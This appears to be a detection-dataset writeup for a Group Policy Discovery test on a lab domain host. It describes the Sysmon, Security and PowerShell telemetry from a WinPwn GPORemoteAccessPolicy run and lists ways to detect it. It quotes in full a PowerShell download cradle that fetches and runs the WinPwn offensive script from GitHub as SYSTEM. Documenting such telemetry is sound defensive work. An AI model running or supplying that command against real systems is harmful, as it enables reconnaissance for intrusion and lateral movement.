# T1615-4: Group Policy Discovery — WinPwn - GPORemoteAccessPolicy

## Technique Context

T1615 (Group Policy Discovery) includes targeted enumeration of specific GPO categories relevant to an adversary's objectives. WinPwn's `GPORemoteAccessPolicy` function focuses specifically on GPOs that control remote access configurations — RDP settings, WinRM policies, firewall rules applied via GPO — making it particularly relevant for adversaries planning lateral movement. This is a more targeted variant than general GPO enumeration.

## What This Dataset Contains

This dataset captures a WinPwn `GPORemoteAccessPolicy` invocation via IEX download cradle, executed as NT AUTHORITY\SYSTEM on ACME-WS02 (Windows 11 Enterprise, acme.local domain member).

**Sysmon (27 events)** — Includes:
- EID 11 (file create): PowerShell startup profile written before the test PowerShell instance launches
- EID 7 (image load): DLL loads for the test PowerShell process (mscoree, system assemblies, Defender DLL tagged T1574.002)
- EID 17 (named pipe): PSHost pipe for the test PowerShell instance
- EID 10 (process access): PowerShell accessing another process, tagged `technique_id=T1055.001`
- EID 1 (process create):
  - `whoami.exe` tagged `technique_id=T1033`
  - `powershell.exe` with command line: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPORemoteAccessPolicy -consoleoutput -noninteractive}` — tagged `technique_id=T1059.001`
- EID 22 (DNS query): `raw.githubusercontent.com` resolution
- EID 11 (file create): additional PowerShell profile file writes

**Security log (10 events)** — EID 4688/4689 process lifecycle events and EID 4703 token right adjustments. The token adjustment for the test PowerShell process shows the same broad privilege set as other test executions.

**PowerShell log (52 events)** — EID 4104 captures both the wrapper and inner script block containing the WinPwn URL and `GPORemoteAccessPolicy -consoleoutput -noninteractive`. EID 4100 error entries are present (consistent with the script failing to complete). Standard test framework boilerplate stubs appear alongside a large EID 4104 block from `Microsoft.PowerShell.Core\Export-ModuleMember` — a fragment of a loaded PowerShell module (NetIPv4Protocol cdxml), indicating some module loading did occur before execution was interrupted.

## What This Dataset Does Not Contain (and Why)

- **WinPwn GPO enumeration results** — As with T1615-3, the actual remote access policy GPO data is not present, consistent with Defender blocking the downloaded script or AMSI preventing full execution.
- **Network connection events for the download** — No Sysmon EID 3 appears for the PowerShell outbound connection; the DNS query is present but the TCP connection event was not captured (may have been blocked before connection established, or fell outside the event filter window).
- **RDP or WinRM GPO details** — The specific remote access policy configurations that GPORemoteAccessPolicy would identify are not captured.
- **Sysmon ProcessCreate for the outer test framework powershell.exe** — Same sysmon-modular filtering behavior as other tests in this series.

## Assessment

This test is structurally identical to T1615-3 but targets a more specific and operationally sensitive function: remote access policy enumeration. The telemetry captured — Sysmon process create with full command line, PowerShell script block with the exact WinPwn function name and parameters, and DNS resolution of the WinPwn repository — is sufficient for detection and attribution. The EID 4100 error entries in the PowerShell log suggest the script did not complete successfully. The presence of a NetIPv4Protocol module fragment in the script block log indicates some PowerShell module loading did occur during the session.

## Detection Opportunities Present in This Data

- **Sysmon EID 1 / PowerShell EID 4104**: The string `GPORemoteAccessPolicy` in either event source directly names the adversary's objective (enumerating remote access GPOs for lateral movement planning).
- **PowerShell EID 4104**: Same WinPwn GitHub URL pattern as T1615-3; both tests use the same pinned commit hash, enabling hash-based IOC matching.
- **Sysmon EID 22**: DNS resolution of `raw.githubusercontent.com` from a SYSTEM PowerShell process, correlated with a preceding `whoami.exe` execution, indicates a scripted reconnaissance sequence.
- **Behavioral chain**: SYSTEM PowerShell → whoami → IEX download cradle → WinPwn function is a repeatable behavioral sequence visible across the T1615-3 and T1615-4 datasets, suggesting rule development against the pattern rather than just specific IOCs.
